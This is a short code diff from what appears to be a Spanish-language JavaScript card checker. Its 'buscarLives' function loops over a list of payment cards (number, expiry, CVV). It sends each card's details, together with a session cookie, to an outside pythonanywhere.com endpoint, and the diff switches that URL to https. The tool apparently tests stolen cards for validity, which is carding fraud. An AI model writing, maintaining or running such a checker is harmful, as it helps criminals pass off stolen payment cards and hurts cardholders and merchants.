@@ -179,7 +179,7 @@ async function buscarLives(){
     for(let i = 0; i < tarjetas.length; ++i){
         pEstado.textContent = "Probando: " + tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv;
 
-        let url = `http://aaroncc.pythonanywhere.com/?numero=${tarjetas[i].numero}&mes=${tarjetas[i].mes}&anyo=${tarjetas[i].anyo}&cookie=${cookie}`;
+        let url = `https://aaroncc.pythonanywhere.com/?numero=${tarjetas[i].numero}&mes=${tarjetas[i].mes}&anyo=${tarjetas[i].anyo}&cookie=${cookie}`;
         
         try{
           const response = await fetch(url);
